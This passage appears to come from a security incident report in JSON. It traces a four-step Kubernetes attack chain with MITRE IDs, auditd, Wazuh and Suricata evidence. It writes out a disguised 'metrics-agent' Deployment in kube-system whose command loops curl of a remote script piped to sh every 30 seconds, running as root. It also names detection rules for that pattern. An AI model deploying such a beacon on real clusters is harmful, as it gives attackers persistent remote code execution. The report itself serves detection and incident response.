  "attack_progression": [
    {"step": 1, "tactic": "Resource Development / Staging", "technique": "T1543", "what_happened": "At 2026-05-13 01:42:08 UTC, Linux auditd on the cluster admin jump host k8s-admin-01 (agent 10.108.57.41 zone, host-level audit) logged a process execution writing a Kubernetes Deployment manifest to /tmp/k8s_sim_20260513_014208/dep_metrics-agent.yaml. The auditd EXECVE record shows data.audit.command involving a heredoc cat redirect by data.audit.uid=0 (root). The manifest declares kind=Deployment, metadata.name=metrics-agent, namespace=kube-system, with a container image curlimages/curl:latest and command [\"sh\",\"-c\",\"while true; do curl -s http://10.108.57.200/x.sh | sh; sleep 30; done\"]. restartPolicy is the Deployment default (Always).", "chain_reason": "Wazuh FIM (syscheck) recorded the creation of a YAML file under /tmp matching a Kubernetes Deployment manifest; the auditd EXECVE that produced it shares the same host and the same root uid within the same second window.", "first_seen": "2026-05-13T01:42:08+0000"},
    {"step": 2, "tactic": "Persistence / Execution", "technique": "T1543", "what_happened": "At 01:45:02 UTC the same host k8s-admin-01 executed kubectl (auditd EXECVE: data.audit.exe=/usr/bin/kubectl, data.audit.command containing 'apply -f', data.audit.uid=0) which opened an outbound TCP session to the Kubernetes API server 10.108.57.10:6443. Suricata logged the API-server traffic (data.srcip=10.108.57.41-zone host, data.dstip=10.108.57.10, data.dstport=6443) — a kubectl create/apply against the apiVersion apps/v1 deployments endpoint in the kube-system namespace.", "chain_reason": "The kubectl EXECVE on the same host immediately follows the manifest-write EXECVE; Suricata correlates an outbound 6443 (kube-apiserver) flow from the same source host within the same minute, matching a Deployment create call.", "first_seen": "2026-05-13T01:45:02+0000"},
    {"step": 3, "tactic": "Persistence — Container Service / Restart Policy Abuse", "technique": "T1610", "what_happened": "By 01:45:30 UTC worker node 10.108.57.41 began running the metrics-agent pod. Wazuh fired rule 99400 'K8s: Deployment with curl|sh in system namespace' [T1543] and rule 99401 'K8s: Workload no resource limits + no secContext' [T1543]: the Deployment template runs curlimages/curl:latest (public registry, not registry.corp.local), no resources.limits, no securityContext.runAsNonRoot — container executes as root. restartPolicy=Always guarantees the pod respawns on kill or node drain.", "chain_reason": "Wazuh rule.groups containing the k8s/container audit group fired rule.id 99400 and 99401 with rule.mitre.id T1543 on the worker-node agent within a minute of the kubectl apply — the deployed workload matches the staged manifest exactly.", "first_seen": "2026-05-13T01:45:30+0000"},
    {"step": 4, "tactic": "Command and Control", "technique": "T1071.001", "what_happened": "From 01:45:33 UTC onward the metrics-agent pod on node 10.108.57.41 issued the in-container payload: a repeating HTTP GET to http://10.108.57.200/x.sh piped to sh, every ~30 seconds. Suricata logged the outbound flow data.srcip=10.108.57.41, data.dstip=10.108.57.200, data.dstport=80 with data.url=/x.sh and a DNS/HTTP user-agent consistent with curl. The 30-second loop is the restartPolicy-backed beacon: even if the SOC kills the pod, the Deployment controller respawns it and the curl|sh loop resumes.", "chain_reason": "Suricata HTTP events with data.url=/x.sh and data.dstip=10.108.57.200 repeat on a fixed ~30s interval from the worker-node source; the cadence and the curl|sh command from the manifest tie the network beacon to the container workload.", "first_seen": "2026-05-13T01:45:33+0000"}
